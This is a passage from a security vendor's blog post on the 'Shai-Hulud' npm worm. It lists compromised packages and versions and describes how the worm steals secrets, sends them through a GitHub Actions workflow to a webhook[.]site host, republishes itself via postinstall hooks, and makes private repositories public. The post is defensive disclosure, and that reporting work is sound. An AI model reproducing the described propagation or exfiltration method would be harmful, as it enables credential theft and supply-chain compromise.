9.0.46</td></tr><tr><td>@operato/data-grist</td><td>9.0.29, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/graphql</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/headroom</td><td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/help</td><td>9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/i18n</td><td>9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/input</td><td>9.0.27, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/layout</td><td>9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/popup</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/pull-to-refresh</td><td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42</td></tr><tr><td>@operato/shell</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39</td></tr><tr><td>@operato/styles</td><td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/utils</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@teselagen/bounce-loader</td><td>0.3.16, 0.3.17</td></tr><tr><td>@teselagen/liquibase-tools</td><td>0.4.1</td></tr><tr><td>@teselagen/range-utils</td><td>0.3.14, 0.3.15</td></tr><tr><td>@teselagen/react-list</td><td>0.8.19, 0.8.20</td></tr><tr><td>@teselagen/react-table</td><td>6.10.19</td></tr><tr><td>@thangved/callback-window</td><td>1.1.4</td></tr><tr><td>@things-factory/attachment-base</td><td>9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50</td></tr><tr><td>@things-factory/auth-base</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/email-base</td><td>9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50, 9.0.51, 9.0.52, 9.0.53, 9.0.54</td></tr><tr><td>@things-factory/env</td><td>9.0.42, 9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/integration-base</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/integration-marketplace</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/shell</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@tnf-dev/api</td><td>1.0.8</td></tr><tr><td>@tnf-dev/core</td><td>1.0.8</td></tr><tr><td>@tnf-dev/js</td><td>1.0.8</td></tr><tr><td>@tnf-dev/mui</td><td>1.0.8</td></tr><tr><td>@tnf-dev/react</td><td>1.0.8</td></tr><tr><td>@ui-ux-gang/devextreme-angular-rpk</td><td>24.1.7</td></tr><tr><td>@yoobic/design-system</td><td>6.5.17</td></tr><tr><td>@yoobic/jpeg-camera-es6</td><td>1.0.13</td></tr><tr><td>@yoobic/yobi</td><td>8.7.53</td></tr><tr><td>airchief</td><td>0.3.1</td></tr><tr><td>airpilot</td><td>0.8.8</td></tr><tr><td>angulartics2</td><td>14.1.1, 14.1.2</td></tr><tr><td>browser-webdriver-downloader</td><td>3.0.8</td></tr><tr><td>capacitor-notificationhandler</td><td>0.0.2, 0.0.3</td></tr><tr><td>capacitor-plugin-healthapp</td><td>0.0.2, 0.0.3</td></tr><tr><td>capacitor-plugin-ihealth</td><td>1.1.8, 1.1.9</td></tr><tr><td>capacitor-plugin-vonage</td><td>1.0.2, 1.0.3</td></tr><tr><td>capacitorandroidpermissions</td><td>0.0.4, 0.0.5</td></tr><tr><td>config-cordova</td><td>0.8.5</td></tr><tr><td>cordova-plugin-voxeet2</td><td>1.0.24</td></tr><tr><td>cordova-voxeet</td><td>1.0.32</td></tr><tr><td>create-hest-app</td><td>0.1.9</td></tr><tr><td>db-evo</td><td>1.1.4, 1.1.5</td></tr><tr><td>devextreme-angular-rpk</td><td>21.2.8</td></tr><tr><td>ember-browser-services</td><td>5.0.2, 5.0.3</td></tr><tr><td>ember-headless-form</td><td>1.1.2, 1.1.3</td></tr><tr><td>ember-headless-form-yup</td><td>1.0.1</td></tr><tr><td>ember-headless-table</td><td>2.1.5, 2.1.6</td></tr><tr><td>ember-url-hash-polyfill</td><td>1.0.12, 1.0.13</td></tr><tr><td>ember-velcro</td><td>2.2.1, 2.2.2</td></tr><tr><td>encounter-playground</td><td>0.0.2, 0.0.3, 0.0.4, 0.0.5</td></tr><tr><td>eslint-config-crowdstrike</td><td>11.0.2, 11.0.3</td></tr><tr><td>eslint-config-crowdstrike-node</td><td>4.0.3, 4.0.4</td></tr><tr><td>eslint-config-teselagen</td><td>6.1.7</td></tr><tr><td>globalize-rpk</td><td>1.7.4</td></tr><tr><td>graphql-sequelize-teselagen</td><td>5.3.8</td></tr><tr><td>html-to-base64-image</td><td>1.0.2</td></tr><tr><td>json-rules-engine-simplified</td><td>0.2.1</td></tr><tr><td>jumpgate</td><td>0.0.2</td></tr><tr><td>koa2-swagger-ui</td><td>5.11.1, 5.11.2</td></tr><tr><td>mcfly-semantic-release</td><td>1.3.1</td></tr><tr><td>mcp-knowledge-base</td><td>0.0.2</td></tr><tr><td>mcp-knowledge-graph</td><td>1.2.1</td></tr><tr><td>mobioffice-cli</td><td>1.0.3</td></tr><tr><td>monorepo-next</td><td>13.0.1, 13.0.2</td></tr><tr><td>mstate-angular</td><td>0.4.4</td></tr><tr><td>mstate-cli</td><td>0.4.7</td></tr><tr><td>mstate-dev-react</td><td>1.1.1</td></tr><tr><td>mstate-react</td><td>1.6.5</td></tr><tr><td>ng2-file-upload</td><td>7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1</td></tr><tr><td>ngx-bootstrap</td><td>18.1.4, 19.0.3, 19.0.4, 20.0.3, 20.0.4, 20.0.5</td></tr><tr><td>ngx-color</td><td>10.0.1, 10.0.2</td></tr><tr><td>ngx-toastr</td><td>19.0.1, 19.0.2</td></tr><tr><td>ngx-trend</td><td>8.0.1</td></tr><tr><td>ngx-ws</td><td>1.1.5, 1.1.6</td></tr><tr><td>oradm-to-gql</td><td>35.0.14, 35.0.15</td></tr><tr><td>oradm-to-sqlz</td><td>1.1.2</td></tr><tr><td>ove-auto-annotate</td><td>0.0.9</td></tr><tr><td>pm2-gelf-json</td><td>1.0.4, 1.0.5</td></tr><tr><td>printjs-rpk</td><td>1.6.1</td></tr><tr><td>react-complaint-image</td><td>0.0.32</td></tr><tr><td>react-jsonschema-form-conditionals</td><td>0.3.18</td></tr><tr><td>remark-preset-lint-crowdstrike</td><td>4.0.1, 4.0.2</td></tr><tr><td>rxnt-authentication</td><td>0.0.3, 0.0.4, 0.0.5, 0.0.6</td></tr><tr><td>rxnt-healthchecks-nestjs</td><td>1.0.2, 1.0.3, 1.0.4, 1.0.5</td></tr><tr><td>rxnt-kue</td><td>1.0.4, 1.0.5, 1.0.6, 1.0.7</td></tr><tr><td>swc-plugin-component-annotate</td><td>1.9.1, 1.9.2</td></tr><tr><td>tbssnch</td><td>1.0.2</td></tr><tr><td>teselagen-interval-tree</td><td>1.1.2</td></tr><tr><td>tg-client-query-builder</td><td>2.14.4, 2.14.5</td></tr><tr><td>tg-redbird</td><td>1.3.1</td></tr><tr><td>tg-seq-gen</td><td>1.0.9, 1.0.10</td></tr><tr><td>thangved-react-grid</td><td>1.0.3</td></tr><tr><td>ts-gaussian</td><td>3.0.5, 3.0.6</td></tr><tr><td>ts-imports</td><td>1.0.1, 1.0.2</td></tr><tr><td>tvi-cli</td><td>0.1.5</td></tr><tr><td>ve-bamreader</td><td>0.2.6</td></tr><tr><td>ve-editor</td><td>1.0.1</td></tr><tr><td>verror-extra</td><td>6.0.1</td></tr><tr><td>voip-callkit</td><td>1.0.2, 1.0.3</td></tr><tr><td>wdio-web-reporter</td><td>0.1.3</td></tr><tr><td>yargs-help-output</td><td>5.0.3</td></tr><tr><td>yoo-styles</td><td>6.0.326</td></tr></tbody></table></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c936379bfcdd38371b2acc_Group%202147255852.png' /></section><section class='parsed-content'><div><div><div><div><p>Published on:</p><p>September 16, 2025</p></div><div><p>Last updated on:</p><p>September 16, 2025</p></div></div><div><p>This morning, we were alerted to a large-scale attack against npm. This appears to the be work of the same threat actors behind the Nx attack on August 27th 2025.&nbsp;This was originally published by <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">Socket</a> and <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised">StepSecurity</a> who noted 40 packages had been comrpomised, since then an additional 147 packages have been infected with malware including packages from CrowdStrike. </p><p>The scale, scope and impact of this attack is significant. The attackers are using the same playbook in large parts as the original attack, but have stepped up their game. They have turned it into a full worm, which does these things automatically:</p><ul><li>Steal secrets and publish them to GitHub publicly</li><li>Run trufflehog and query Cloud metadata endpoints to gather secrets</li><li>Attempt to create a new GitHub action with a data exiltration mechanism through webhook[.]site</li><li>Iterate the repositories on GitHub a user has access to, and make them public<br></li></ul><p>Since our initial alert this morning we&rsquo;ve confirmed the following additional behaviours and important details. For those that don't know, Shai&nbsp;Hulud is the name for the worm in the Dune franchise. A clear indication of the intent of the attackers.</p><figure><figcaption><em>Shai&nbsp;Hulud, from Dune</em></figcaption></figure><p>To avoid being compromised by packages like this, check out Aikido <a href="https://www.aikido.dev/blog/introducing-safe-chain">safe-chain</a>!</p><h2>What the worm does </h2><ul><li><strong>Harvest</strong>: scans the host and CI environment for secrets &mdash; process.env, scanning with TruffleHog, and cloud metadata endpoints (AWS/GCP) that return instance/service credentials.<br></li><li><strong>Exfiltrate (1) &mdash; GitHub repo</strong>: creates a repo named <strong>Shai-Hulud</strong> under the compromised account and commits a JSON dump containing system info, environment variables, and collected secrets.<br></li><li><strong>Exfiltrate (2) &mdash; GitHub Actions &rarr; webhook</strong>: drops a workflow <code>.github/workflows/shai-hulud-workflow.yml</code> that serializes <code>${{ toJSON(secrets) }}</code>, POSTs them to an attacker <code>webhook[.]site</code> URL and writes a double-base64 copy into the Actions logs.<br></li><li><strong>Propagate</strong>: uses any valid npm tokens it finds to enumerate and attempt to update packages the compromised maintainer controls (supply-chain propagation).<br></li><li><strong>Amplify</strong>: iterates the victim&rsquo;s accessible repositories, making them public or adding the workflow/branch that will trigger further runs and leaks.</li></ul><p>&zwj;</p><h2>Leaking of secrets</h2><p>As with the original Nx attack, we're seeing the attackers doing a smash-and-grab style attack. The malicous payload both publishes a "Shai-Hulud"&nbsp;repository with stolen credentials/tokens, and it will go through a GitHub account and turn private repository to public:</p><p>&zwj;</p><figure><figcaption><em>Stolen credentials being published</em></figcaption></figure><p>&zwj;</p><figure><figcaption><em>Private repositories being turned public</em></figcaption></figure><p>&zwj;</p><h2>Self-propogation through npm</h2><p>One of the most striking features of this attack is that it behaves like a <strong>true worm</strong>. Rather than relying on a single infected package to spread, the code is designed to <strong>re-publish itself into other npm packages</strong> owned by the compromised maintainer.</p><p>Here&rsquo;s how the worm logic works:</p><ul><li><strong>Download a target tarball</strong> &ndash; it fetches an existing package version from the npm registry.</li><li><strong>Modify <code>package.json</code></strong> &ndash; the worm bumps the patch version (e.g. <code>1.2.3 &rarr; 1.2.4</code>) and inserts a new lifecycle hook&nbsp;(<code>postinstall</code>)<code>&zwj;</code></li><li><strong>Copy its own payload</strong> &ndash; the running script (<code>process.argv[1]</code>) is written into the tarball as <code>bundle.js</code>. This ensures that whatever code infected one package now lives inside the next.</li><li><strong>Re-publish the trojanized package</strong> &ndash; the modified tarball is gzipped and pushed back to npm using the maintainer&rsquo;s credentials.</li></ul><p>This cycle allows the malware to <strong>continuously infect every package</strong> a maintainer has access to. Each published package becomes a new distribution vector: as soon as someone installs it, the worm executes, replicates, and pushes itself further into the ecosystem.</p><p>In short: the attacker doesn&rsquo;t need to manually target packages. Once a single environment is compromised, the worm automates the spread by <strong>piggybacking on the maintainer&rsquo;s own publishing rights</strong>.</p><h2>Impacted packages</h2><div><table> <thead> <tr> <th>Package</th> <th>Versions</th> </tr> </thead> <tbody> <tr> <td>@ahmedhfarag/ngx-perfect-scrollbar</td> <td>20.0.20</td> </tr> <tr> <td>@ahmedhfarag/ngx-virtual-scroller</td> <td>4.0.4</td> </tr> <tr> <td>@art-ws/common</td> <td>2.0.28</td> </tr> <tr> <td>@art-ws/config-eslint</td> <td>2.0.4, 2.0.5</td> </tr> <tr> <td>@art-ws/config-ts</td> <td>2.0.7, 2.0.8</td> </tr> <tr> <td>@art-ws/db-context</td> <td>2.0.24</td> </tr> <tr> <td>@art-ws/di</td> <td>2.0.28, 2.0.32</td> </tr> <tr> <td>@art-ws/di-node</td> <td>2.0.13</td> </tr> <tr> <td>@art-ws/eslint</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/fastify-http-server</td> <td>2.0.24, 2.0.27</td> </tr> <tr> <td>@art-ws/http-server</td> <td>2.0.21, 2.0.25</td> </tr> <tr> <td>@art-ws/openapi</td> <td>0.1.9, 0.1.12</td> </tr> <tr> <td>@art-ws/package-base</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/prettier</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/slf</td> <td>2.0.15, 2.0.22</td> </tr> <tr> <td>@art-ws/ssl-info</td> <td>1.0.9, 1.0.10</td> </tr> <tr> <td>@art-ws/web-app</td> <td>1.0.3, 1.0.4</td> </tr> <tr> <td>@crowdstrike/commitlint</td> <td>8.1.1, 8.1.2</td> </tr> <tr> <td>@crowdstrike/falcon-shoelace</td> <td>0.4.1, 0.4.2</td> </tr> <tr> <td>@crowdstrike/foundry-js</td> <td>0.19.1, 0.19.2</td> </tr> <tr> <td>@crowdstrike/glide-core</td> <td>0.34.2, 0.34.3</td> </tr> <tr> <td>@crowdstrike/logscale-dashboard</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-file-editor</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-parser-edit</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-search</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/tailwind-toucan-base</td> <td>5.0.1, 5.0.2</td> </tr> <tr> <td>@ctrl/deluge</td> <td>7.2.1, 7.2.2</td> </tr> <tr> <td>@ctrl/golang-template</td> <td>1.4.2, 1.4.3</td> </tr> <tr> <td>@ctrl/magnet-link</td> <td>4.0.3, 4.0.4</td> </tr> <tr> <td>@ctrl/ngx-codemirror</td> <td>7.0.1, 7.0.2</td> </tr> <tr> <td>@ctrl/ngx-csv</td> <td>6.0.1, 6.0.2</td> </tr> <tr> <td>@ctrl/ngx-emoji-mart</td> <td>9.2.1, 9.2.2</td> </tr> <tr> <td>@ctrl/ngx-rightclick</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>@ctrl/qbittorrent</td> <td>9.7.1, 9.7.2</td> </tr> <tr> <td>@ctrl/react-adsense</td> <td>2.0.1, 2.0.2</td> </tr> <tr> <td>@ctrl/shared-torrent</td> <td>6.3.1, 6.3.2</td> </tr> <tr> <td>@ctrl/tinycolor</td> <td>4.1.1, 4.1.2</td> </tr> <tr> <td>@ctrl/torrent-file</td> <td>4.1.1, 4.1.2</td> </tr> <tr> <td>@ctrl/transmission</td> <td>7.3.1</td> </tr> <tr> <td>@ctrl/ts-base32</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>@hestjs/core</td> <td>0.2.1</td> </tr> <tr> <td>@hestjs/cqrs</td> <td>0.1.6</td> </tr> <tr> <td>@hestjs/demo</td> <td>0.1.2</td> </tr> <tr> <td>@hestjs/eslint-config</td> <td>0.1.2</td> </tr> <tr> <td>@hestjs/logger</td> <td>0.1.6</td> </tr> <tr> <td>@hestjs/scalar</td> <td>0.1.7</td> </tr> <tr> <td>@hestjs/validation</td> <td>0.1.6</td> </tr> <tr> <td>@nativescript-community/arraybuffers</td> <td>1.1.6, 1.1.7, 1.1.8</td> </tr> <tr> <td>@nativescript-community/gesturehandler</td> <td>2.0.35</td> </tr> <tr> <td>@nativescript-community/perms</td> <td>3.0.5, 3.0.6, 3.0.7, 3.0.8</td> </tr> <tr> <td>@nativescript-community/sqlite</td> <td>3.5.2, 3.5.3, 3.5.4, 3.5.5</td> </tr> <tr> <td>@nativescript-community/text</td> <td>1.6.9, 1.6.10, 1.6.11, 1.6.12</td> </tr> <tr> <td>@nativescript-community/typeorm</td> <td>0.2.30, 0.2.31, 0.2.32, 0.2.33</td> </tr> <tr> <td>@nativescript-community/ui-collectionview</td> <td>6.0.6</td> </tr> <tr> <td>@nativescript-community/ui-document-picker</td> <td>1.1.27, 1.1.28</td> </tr> <tr> <td>@nativescript-community/ui-drawer</td> <td>0.1.30</td> </tr> <tr> <td>@nativescript-community/ui-image</td> <td>4.5.6</td> </tr> <tr> <td>@nativescript-community/ui-label</td> <td>1.3.35, 1.3.36, 1.3.37</td> </tr> <tr> <td>@nativescript-community/ui-material-bottom-navigation</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-bottomsheet</td> <td>7.2.72</td> </tr> <tr> <td>@nativescript-community/ui-material-core</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-core-tabs</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-ripple</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-tabs</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-pager</td> <td>14.1.36, 14.1.37, 14.1.38</td> </tr> <tr> <td>@nativescript-community/ui-pulltorefresh</td> <td>2.5.4, 2.5.5, 2.5.6, 2.5.7</td> </tr> <tr> <td>@nexe/config-manager</td> <td>0.1.1</td> </tr> <tr> <td>@nexe/eslint-config</td> <td>0.1.1</td> </tr> <tr> <td>@nexe/logger</td> <td>0.1.3</td> </tr> <tr> <td>@nstudio/angular</td> <td>20.0.4, 20.0.5, 20.0.6</td> </tr> <tr> <td>@nstudio/focus</td> <td>20.0.4, 20.0.5, 20.0.6</td> </tr> <tr> <td>@nstudio/nativescript-checkbox</td> <td>2.0.6, 2.0.7, 2.0.8, 2.0.9</td> </tr> <tr> <td>@nstudio/nativescript-loading-indicator</td> <td>5.0.1, 5.0.2, 5.0.3, 5.0.4</td> </tr> <tr> <td>@nstudio/ui-collectionview</td> <td>5.1.11, 5.1.12, 5.1.13, 5.1.14</td> </tr> <tr> <td>@nstudio/web</td> <td>20.0.4</td> </tr> <tr> <td>@nstudio/web-angular</td> <td>20.0.4</td> </tr> <tr> <td>@nstudio/xplat</td> <td>20.0.5, 20.0.6, 20.0.7</td> </tr> <tr> <td>@nstudio/xplat-utils</td> <td>20.0.5, 20.0.6, 20.0.7</td> </tr> <tr> <td>@operato/board</td> <td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/data-grist</td> <td>9.0.29, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/graphql</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/headroom</td> <td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/help</td> <td>9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/i18n</td> <td>9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/input</td> <td>9.0.27, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/layout</td> <td>9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/popup</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/pull-to-refresh</td> <td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42</td> </tr> <tr> <td>@operato/shell</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39</td> </tr> <tr> <td>@operato/styles</td> <td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/utils</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@teselagen/bounce-loader</td> <td>0.3.16, 0.3.17</td> </tr> <tr> <td>@teselagen/liquibase-tools</td> <td>0.4.1</td> </tr> <tr> <td>@teselagen/range-utils</td> <td>0.3.14, 0.3.15</td> </tr> <tr> <td>@teselagen/react-list</td> <td>0.8.19, 0.8.20</td> </tr> <tr> <td>@teselagen/react-table</td> <td>6.10.19</td> </tr> <tr> <td>@thangved/callback-window</td> <td>1.1.4</td> </tr> <tr> <td>@things-factory/attachment-base</td> <td>9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50</td> </tr> <tr> <td>@things-factory/auth-base</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/email-base</td> <td>9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50, 9.0.51, 9.0.52, 9.0.53, 9.0.54</td> </tr> <tr> <td>@things-factory/env</td> <td>9.0.42, 9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/integration-base</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/integration-marketplace</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/shell</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@tnf-dev/api</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/core</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/js</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/mui</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/react</td> <td>1.0.8</td> </tr> <tr> <td>@ui-ux-gang/devextreme-angular-rpk</td> <td>24.1.7</td> </tr> <tr> <td>@yoobic/design-system</td> <td>6.5.17</td> </tr> <tr> <td>@yoobic/jpeg-camera-es6</td> <td>1.0.13</td> </tr> <tr> <td>@yoobic/yobi</td> <td>8.7.53</td> </tr> <tr> <td>airchief</td> <td>0.3.1</td> </tr> <tr> <td>airpilot</td> <td>0.8.8</td> </tr> <tr> <td>angulartics2</td> <td>14.1.1, 14.1.2</td> </tr> <tr> <td>browser-webdriver-downloader</td> <td>3.0.8</td> </tr> <tr> <td>capacitor-notificationhandler</td> <td>0.0.2, 0.0.3</td> </tr> <tr> <td>capacitor-plugin-healthapp</td> <td>0.0.2, 0.0.3</td> </tr> <tr> <td>capacitor-plugin-ihealth</td> <td>1.1.8, 1.1.9</td> </tr> <tr> <td>capacitor-plugin-vonage</td> <td>1.0.2, 1.0.3</td> </tr> <tr> <td>capacitorandroidpermissions</td> <td>0.0.4, 0.0.5</td> </tr> <tr> <td>config-cordova</td> <td>0.8.5</td> </tr> <tr> <td>cordova-plugin-voxeet2</td> <td>1.0.24</td> </tr> <tr> <td>cordova-voxeet</td> <td>1.0.32</td> </tr> <tr> <td>create-hest-app</td> <td>0.1.9</td> </tr> <tr> <td>db-evo</td> <td>1.1.4, 1.1.5</td> </tr> <tr> <td>devextreme-angular-rpk</td> <td>21.2.8</td> </tr> <tr> <td>ember-browser-services</td> <td>5.0.2, 5.0.3</td> </tr> <tr> <td>ember-headless-form</td> <td>1.1.2, 1.1.3</td> </tr> <tr> <td>ember-headless-form-yup</td> <td>1.0.1</td> </tr> <tr> <td>ember-headless-table</td> <td>2.1.5, 2.1.6</td> </tr> <tr> <td>ember-url-hash-polyfill</td> <td>1.0.12, 1.0.13</td> </tr> <tr> <td>ember-velcro</td> <td>2.2.1, 2.2.2</td> </tr> <tr> <td>encounter-playground</td> <td>0.0.2, 0.0.3, 0.0.4, 0.0.5</td> </tr> <tr> <td>eslint-config-crowdstrike</td> <td>11.0.2, 11.0.3</td> </tr> <tr> <td>eslint-config-crowdstrike-node</td> <td>4.0.3, 4.0.4</td> </tr> <tr> <td>eslint-config-teselagen</td> <td>6.1.7</td> </tr> <tr> <td>globalize-rpk</td> <td>1.7.4</td> </tr> <tr> <td>graphql-sequelize-teselagen</td> <td>5.3.8</td> </tr> <tr> <td>html-to-base64-image</td> <td>1.0.2</td> </tr> <tr> <td>json-rules-engine-simplified</td> <td>0.2.1</td> </tr> <tr> <td>jumpgate</td> <td>0.0.2</td> </tr> <tr> <td>koa2-swagger-ui</td> <td>5.11.1, 5.11.2</td> </tr> <tr> <td>mcfly-semantic-release</td> <td>1.3.1</td> </tr> <tr> <td>mcp-knowledge-base</td> <td>0.0.2</td> </tr> <tr> <td>mcp-knowledge-graph</td> <td>1.2.1</td> </tr> <tr> <td>mobioffice-cli</td> <td>1.0.3</td> </tr> <tr> <td>monorepo-next</td> <td>13.0.1, 13.0.2</td> </tr> <tr> <td>mstate-angular</td> <td>0.4.4</td> </tr> <tr> <td>mstate-cli</td> <td>0.4.7</td> </tr> <tr> <td>mstate-dev-react</td> <td>1.1.1</td> </tr> <tr> <td>mstate-react</td> <td>1.6.5</td> </tr> <tr> <td>ng2-file-upload</td> <td>7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1</td> </tr> <tr> <td>ngx-bootstrap</td> <td>18.1.4, 19.0.3, 19.0.4, 20.0.3, 20.0.4, 20.0.5</td> </tr> <tr> <td>ngx-color</td> <td>10.0.1, 10.0.2</td> </tr> <tr> <td>ngx-toastr</td> <td>19.0.1, 19.0.2</td> </tr> <tr> <td>ngx-trend</td> <td>8.0.1</td> </tr> <tr> <td>ngx-ws</td> <td>1.1.5, 1.1.6</td> </tr> <tr> <td>oradm-to-gql</td> <td>35.0.14, 35.0.15</td> </tr> <tr> <td>oradm-to-sqlz</td> <td>1.1.2</td> </tr> <tr> <td>ove-auto-annotate</td> <td>0.0.9</td> </tr> <tr> <td>pm2-gelf-json</td> <td>1.0.4, 1.0.5</td> </tr> <tr> <td>printjs-rpk</td> <td>1.6.1</td> </tr> <tr> <td>react-complaint-image</td> <td>0.0.32</td> </tr> <tr> <td>react-jsonschema-form-conditionals</td> <td>0.3.18</td> </tr> <tr> <td>remark-preset-lint-crowdstrike</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>rxnt-authentication</td> <td>0.0.3, 0.0.4, 0.0.5, 0.0.6</td> </tr> <tr> <td>rxnt-healthchecks-nestjs</td> <td>1.0.2, 1.0.3, 1.0.4, 1.0.5</td> </tr> <tr> <td>rxnt-kue</td> <td>1.0.4, 1.0.5, 1.0.6, 1.0.7</td> </tr> <tr> <td>swc-plugin-component-annotate</td> <td>1.9.1, 1.9.2</td> </tr> <tr> <td>tbssnch</td> <td>1.0.2</td> </tr> <tr> <td>teselagen-interval-tree</td> <td>1.1.2</td> </tr> <tr> <td>tg-client-query-builder</td> <td>2.14.4, 2.14.5</td> </tr> <tr> <td>tg-redbird</td> <td>1.3.1</td> </tr> <tr> <td>tg-seq-gen</td> <td>1.0.9, 1.0.10</td> </tr> <tr> <td>thangved-react-grid</td> <td>1.0.3</td> </tr> <tr> <td>ts-gaussian</td> <td>3.0.5, 3.0.6</td> </tr> <tr> <td>ts-imports</td> <td>1.0.1, 1.0.2</td> </tr> <tr> <td>tvi-cli</td> <td>0.1.5</td> </tr> <tr> <td>ve-bamreader</td> <td>0.2.6</td> </tr> <tr> <td>ve-editor</td> <td>1.0.1</td> </tr> <tr> <td>verror-extra</td> <td>6.0.1</td> </tr> <tr> <td>voip-callkit</td> <td>1.0.2, 1.0.3</td> </tr> <tr> <td>wdio-web-reporter</td> <td>0.1.3</td> </tr> <tr> <td>yargs-help-output</td> <td>5.0.3</td> </tr> <tr> <td>yoo-styles</td> <td>6.0.326</td> </tr> </tbody> </table></div><p>&zwj;<strong>Story developing&hellip;</strong></p><h2>Remediation Advice</h2><ul><li>Check the versions you are using</li><li>Clean your npm cache</li><li>Reinstall all packages in your repository</li><li>Make sure you use a package lock file, and use pinned 